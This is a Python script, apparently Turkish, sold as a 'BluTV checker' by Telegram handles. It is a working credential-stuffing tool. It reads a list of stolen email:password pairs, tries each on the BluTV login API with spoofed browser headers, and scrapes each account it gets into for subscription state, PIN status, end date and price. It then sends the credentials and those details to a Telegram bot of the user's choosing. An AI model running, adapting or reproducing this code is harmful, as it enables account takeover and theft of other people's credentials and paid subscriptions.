import requests
import re
from datetime import datetime
import os
import time
import webbrowser
webbrowser.open('https://t.me/thomashack')	
from datetime import datetime
current_time = datetime.now()
expiry_time = datetime.strptime('''2070-02-09 00:00:00.000''', '''%Y-%m-%d %H:%M:%S.%f''')
if current_time > expiry_time:
    print('SÜRESİ DOLDU YAZ \n @phpmehmet')
    exit()
    
    
memo = '''\x1b[1;39m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
\x1b[1;36m    
 ............................................................
............................................................
............................................................
............................................................
............................................................
............................................................
............................................................
............................................................
............................................................
......7GGY..........PGG^................YG:.................
......?@@P:~!~^.....#@@~..!!!:....!7!:~!#@?!!:.......~^.....
......?@@@@@&&@&P~..#@@~..B@@!....B@@~7J#@YJ##^.....?@5.....
......?@@&Y!~~?#@&?.#@@~..B@@!....B@@~..G@:.~&G:...7&P:.....
......?@@G. ...7@@B.#@@~..B@@!....#@@^..G@^..!&G:.~&G:......
......:#@@5!^~?#@@?.Y@@B7:J@@B?~!5@@B...G@^...7&5^#B:.......
.......:JB&&&&&&P~...7G&&!.!P&&&&&BJ:...J&P....?&&#^........
........  :~~~^. ..... .^:....^~^:.......:~.....^!:.........
............................................................
............................................................
............................................................
............................................................
............................................................
............................................................
............................................................
............................................................
............................................................
                < BLU TV CHECKER TOOL >
              TELE : @PHPMEHMET / @THOMASHACK

\x1b[1;39m ▬▬▬▬▬▬▬▬▬\x1b[1;39m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬'''
    
    
   
logo = '''\x1b[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
\x1b[1;36m
@@@@@@@   @@@       @@@  @@@     @@@@@@@  @@@  @@@
@@@@@@@@  @@@       @@@  @@@     @@@@@@@  @@@  @@@
@@!  @@@  @@!       @@!  @@@       @@!    @@!  @@@
!@   @!@  !@!       !@!  @!@       !@!    !@!  @!@
@!@!@!@   @!!       @!@  !@!       @!!    @!@  !@!
!!!@!!!!  !!!       !@!  !!!       !!!    !@!  !!!
!!:  !!!  !!:       !!:  !!!       !!:    :!:  !!:
:!:  !:!   :!:      :!:  !:!       :!:     ::!!:!
 :: ::::   :: ::::  ::::: ::        ::      ::::
:: : ::   : :: : :   : :  :         :        :
                
                < BLU TV CHECKER TOOL >
              TELE : @PHPMEHMET / @THOMASHACK

\x1b[1;31m ▬▬▬▬▬▬▬▬▬\x1b[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬'''
print(logo)
sifre = 'blu'
pss = input('\x1b[1;32m 𝐒𝐢𝐟𝐫𝐞 : ')
if pss == sifre:
    print('\x1b[1;32m                    DOĞRU ŞİFRE✅ ')
    time.sleep(2)
    os.system('clear')
else:
    sys.exit('\x1b[1;31m                    HATALI ŞİFRE❌ ')





print(memo)
def calculate_remaining_days(end_date):
    end_date = datetime.strptime(end_date, '%Y-%m-%d')
    today = datetime.now()
    remaining_days = (end_date - today).days
    return remaining_days

def blutv_checker(bot_token, chat_id, combo_path):
    with open(combo_path, 'r') as file:
        combos = file.readlines()

    for combo in combos:
        email, password = combo.strip().split(':')

        session = requests.Session()

        login_url = 'https://www.blutv.com/api/login'
        data = {
            'username': email,
            'password': password,
            'remember': True,
            'captchaVersion': 'v3',
            'captchaToken': ''
        }

        headers = {
            'Content-Type': 'text/plain;charset=UTF-8',
            'Origin': 'https://www.blutv.com',
            'Referer': 'https://www.blutv.com/giris',
            'Sec-Ch-Ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'
        }

        response = session.post(login_url, json=data, headers=headers)

        if response.status_code == 200:
            capture_text = f'𝐁𝐚𝐬𝐚𝐫𝐢𝐥𝐢 𝐆𝐢𝐫𝐢𝐬  ✅                                              {email}:{password} | 𝙈𝙚𝙢𝙗𝙚𝙧𝙨𝙝𝙞𝙥: '

            profile_url = 'https://www.blutv.com/profil'
            profile_headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3',
                'DNT': '1',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'cross-site',
                'TE': 'trailers'
            }

            profile_response = session.get(profile_url, headers=profile_headers)

            pin_matches = re.findall(r'"hasPin":(.*?),', profile_response.text)
            if pin_matches:
                pin_statuses = [
                    "𝙑𝙖𝙧" if match == "true" else "𝙔𝙤𝙠" for match in pin_matches
                ]
                pin_status_text = " - ".join(
                    f'𝙋𝙞𝙣 {i}: {status}'
                    for i, status in enumerate(pin_statuses, start=1))
                capture_text += f'{pin_status_text} | '

            if '"state":"ACTIVE"' in profile_response.text:
                capture_text += '𝙃𝙚𝙨𝙖𝙥 𝘼𝙠𝙩𝙞𝙛 ✅| '
            elif '"state":"CANCELLED"' in profile_response.text:
                capture_text += '𝙃𝙚𝙨𝙖𝙥 𝙄𝙥𝙩𝙖𝙡 𝙀𝙙𝙞𝙡𝙢𝙞𝙨 | '
            elif '"state":"SUSPEND"' in profile_response.text:
                capture_text += '𝙃𝙚𝙨𝙖𝙥 𝘿𝙪𝙧𝙙𝙪𝙧𝙪𝙡𝙢𝙪𝙨 | '

            subscription_matches = re.findall(r'"end_date":"(.*?)T',
                                              profile_response.text)
            if subscription_matches:
                for match in subscription_matches:
                    remaining_days = calculate_remaining_days(match)
                    capture_text += f'𝐀𝐛𝐨𝐧𝐞𝐥𝐢𝐤 𝐁𝐢𝐭𝐢𝐬 𝐓𝐚𝐫𝐢𝐡𝐢: {match} | 𝙆𝙖𝙡𝙖𝙣 𝙜𝙪𝙣: {remaining_days} | '

            price_matches = re.findall(r'"price":(.*?),', profile_response.text)
            if price_matches:
                last_price = price_matches[-1]
                capture_text += f'𝙊𝙙𝙚𝙣𝙚𝙣 𝙨𝙤𝙣 𝙛𝙞𝙮𝙖𝙩: {last_price} |@phpmehmet & @thomashack'
                capture_text += f"   "

            api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={capture_text}"
            response = requests.get(api_url)

            print(capture_text)

        else:
            print(f'\x1b[1;32m Giriş Başarısız❌: {email}:{password}')

if __name__ == "__main__":
    bot_token = input("\x1b[1;32m𝐓𝐨𝐤𝐞𝐧 𝐆𝐢𝐫𝐢𝐧𝐢𝐳: ")
    chat_id = input("\x1b[1;32m𝐈𝐃 𝐆𝐢𝐫𝐢𝐧𝐢𝐳: ")
    combo_path = input("\x1b[1;32m𝐂𝐨𝐦𝐛𝐨 𝐘𝐨𝐥𝐮 𝐆𝐢𝐫𝐢𝐧𝐢𝐳: ")
    
    blutv_checker(bot_token, chat_id, combo_path)
